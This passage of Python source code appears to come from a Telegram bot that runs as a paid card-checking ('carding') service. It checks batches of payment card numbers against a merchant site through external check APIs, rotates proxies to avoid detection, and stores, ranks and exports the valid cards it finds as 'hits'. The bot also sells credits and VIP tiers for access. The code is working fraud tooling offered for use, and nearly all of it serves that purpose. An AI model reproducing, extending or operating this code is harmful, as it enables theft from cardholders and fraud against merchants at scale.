        parse_mode=ParseMode.HTML
    )

    hits, deads, errors = [], [], []
    sem = asyncio.Semaphore(conc)
    pool = list(proxies)
    lock = asyncio.Lock()
    done = 0
    start = time.time()

    async def worker(session, idx, cc):
        nonlocal done
        # Check cancel
        j = await db.job_get(uid)
        if j and j["cancel"]:
            return
        async with sem:
            proxy = None
            if pool:
                async with lock:
                    proxy = pool[idx % len(pool)]
            data = await check_card(session, cc, site, proxy)
            cat = categorize(data)
            if proxy: await db.proxy_feedback(uid, proxy, cat in ("hit","dead"))
            await db.inc_stat(uid, hit=(cat=="hit"))
            if cat == "hit":
                await db.add_hit(uid, cc, data.get("Gateway","-"),
                                 data.get("Price","-"),
                                 data.get("Response",""), site)
                hits.append((cc, premium_card(cc, data, site)))
            elif cat == "error":
                errors.append(premium_card(cc, data, site))
            else:
                deads.append(premium_card(cc, data, site))

            if uid != OWNER_ID:
                await db.spend_credit(uid, 1)

            done += 1
            if done % 5 == 0 or done == len(cards):
                elapsed = time.time() - start
                eta = (elapsed/done)*(len(cards)-done) if done else 0
                pct = int(done/len(cards)*10)
                bar = "▰"*pct + "▱"*(10-pct)
                await db.job_update(uid, done, len(hits), len(deads), len(errors))
                try:
                    await status_msg.edit_text(
                        f"⚡ <b>CHECKING...</b>\n"
                        f"<code>{bar}</code> {done}/{len(cards)}\n"
                        f"⏱️ ETA: <b>{eta:.0f}s</b>\n"
                        f"✅ {len(hits)} | ❌ {len(deads)} | ⚠️ {len(errors)}",
                        parse_mode=ParseMode.HTML
                    )
                except Exception: pass

    async with aiohttp.ClientSession() as session:
        await asyncio.gather(*[worker(session, i, c) for i, c in enumerate(cards)])

    dur = time.time() - start
    await msg.reply_html(
        f"╔══════════════════════╗\n"
        f"     🏁 <b>COMPLETE</b>\n"
        f"╚══════════════════════╝\n"
        f"⏱️ Time: <b>{dur:.1f}s</b>\n"
        f"⚡ Speed: <b>{len(cards)/max(dur,0.1):.1f} cc/s</b>\n"
        f"💳 Total: <b>{len(cards)}</b>\n"
        f"✅ Hits: <b>{len(hits)}</b>\n"
        f"❌ Dead: <b>{len(deads)}</b>\n"
        f"⚠️ Errors: <b>{len(errors)}</b>"
    )

    if hits:
        fn = f"hits_{uid}_{int(time.time())}.txt"
        with open(fn, "w") as fh:
            fh.write("\n".join(cc for cc, _ in hits))
        await msg.reply_document(open(fn, "rb"),
                                 caption=f"✅ {len(hits)} HITS")
        os.remove(fn)
        await msg.reply_html("🔥 <b>Top Hits</b>\n\n" +
                             "\n\n".join(h[1] for h in hits[:5]))


async def stats_cmd(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    u = await db.get_user(update.effective_user.id)
    if not u: return
    vip = VIP_TIERS.get(u["vip"], VIP_TIERS["free"])
    rate = (u["hits"]/u["total"]*100) if u["total"] else 0
    await update.message.reply_html(
        f"📊 <b>Stats</b>\n\n"
        f"{vip['emoji']} VIP: <b>{u['vip'].upper()}</b>\n"
        f"💰 Credits: <b>{u['credits']}</b>\n"
        f"✅ Hits: <b>{u['hits']}</b>\n"
        f"🔢 Total: <b>{u['total']}</b>\n"
        f"📈 Rate: <b>{rate:.2f}%</b>"
    )


async def top_cmd(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    users = await db.all_users()
    txt = "🏆 <b>Top 10</b>\n\n"
    for i, u in enumerate(users[:10], 1):
        em = VIP_TIERS.get(u["vip"], VIP_TIERS["free"])["emoji"]
        txt += f"{i}. {em} <code>{u['user_id']}</code> — <b>{u['hits']}</b>\n"
    await update.message.reply_html(txt)


async def hits_cmd(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    hits = await db.get_hits(update.effective_user.id, 30)
    if not hits:
        await update.message.reply_text("No hits."); return
    txt = "✅ <b>Recent Hits</b>\n\n" + "\n".join(
        f"<code>{h['cc']}</code> — {h['gateway']}" for h in hits[:15]
    )
    await update.message.reply_html(txt)


async def export_cmd(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    hits = await db.get_hits(uid, 5000)
    if not hits:
        await update.message.reply_text("No hits."); return
    # 3 formats
    fn_csv = f"hits_{uid}.csv"
    with open(fn_csv, "w", newline="") as f:
        w = csv.writer(f)
        w.writerow(["cc","gateway","price","response","site","ts"])
        for h in hits:
            w.writerow([h["cc"], h["gateway"], h["price"],
                        h["response"], h.get("site",""), h["ts"]])
    await update.message.reply_document(open(fn_csv, "rb"),
                                        caption=f"📁 {len(hits)} hits (CSV)")
    os.remove(fn_csv)


async def status_cmd(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    try:
        async with aiohttp.ClientSession() as s:
            async with s.get(STATUS_URL, timeout=15) as r:
                t = await r.text()
                await update.message.reply_text(f"API: {r.status}\n{t[:400]}")
    except Exception as e:
        await update.message.reply_text(f"❌ {e}")


async def help_cmd(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    await start(update, ctx)


# ==================== BACKGROUND ====================
async def api_monitor(app: Application):
    while True:
        try:
            async with aiohttp.ClientSession() as s:
                for u in API_LIST:
                    try:
                        async with s.get(u, params={"cc":"4111111111111111|01|2030|123",
                                                    "site":DEFAULT_SITE}, timeout=20) as r:
                            API_HEALTH[u] = r.status == 200
                    except Exception:
                        API_HEALTH[u] = False
        except Exception: pass
        await asyncio.sleep(180)


async def backup_task(app: Application):
    while True:
        await asyncio.sleep(21600)  # 6 hours
        try:
            if os.path.exists(DB_FILE):
                ts = datetime.utcnow().strftime("%Y%m%d_%H%M")
                shutil.copy(DB_FILE, os.path.join(BACKUP_DIR, f"bk_{ts}.db"))
        except Exception: pass


# ==================== MAIN ====================
async def post_init(app: Application):
    await db.init()
    await db.add_user(OWNER_ID, "owner")
    await db.set_field(OWNER_ID, "approved", 1)
    await db.set_field(OWNER_ID, "credits", 999999)
    await db.set_field(OWNER_ID, "vip", "diamond")
    asyncio.create_task(api_monitor(app))
    asyncio.create_task(backup_task(app))
    print(f"✅ ULTRA PRO MAX ready. Owner: {OWNER_ID}")


def main():
    app = Application.builder().token(BOT_TOKEN).post_init(post_init).build()

    cmds = {
        "start": start, "help": help_cmd,
        "addproxy": addproxy, "myproxy": myproxy, "clearproxy": clearproxy,
        "setsite": setsite, "chk": chk, "sh": sh,
        "stats": stats_cmd, "top": top_cmd, "hits": hits_cmd,
        "export": export_cmd, "status": status_cmd,
        "dashboard": dashboard_cmd, "daily": daily_cmd,
        "invite": invite_cmd, "bin": bin_cmd,
        "jobs": jobs_cmd, "cancel": cancel_cmd, "pay": pay_cmd,
        # Admin
        "approve": approve_cmd, "addcredits": addcredits_cmd,
        "setvip": setvip_cmd,
        "ban": ban_cmd, "unban": unban_cmd,
        "users": users_cmd, "broadcast": broadcast_cmd,
        "maintenance": maintenance_cmd, "turbo": turbo_cmd,
        "gencode": gen_code_cmd, "redeem": redeem_cmd,
    }
    for name, fn in cmds.items():
        app.add_handler(CommandHandler(name, fn))
    app.add_handler(CallbackQueryHandler(cb))

    print("🌌 ULTRA PRO MAX PREMIUM BOT RUNNING")
    app.run_polling(allowed_updates=Update.ALL_TYPES, drop_pending_updates=True)


if __name__ == "__main__":
    main()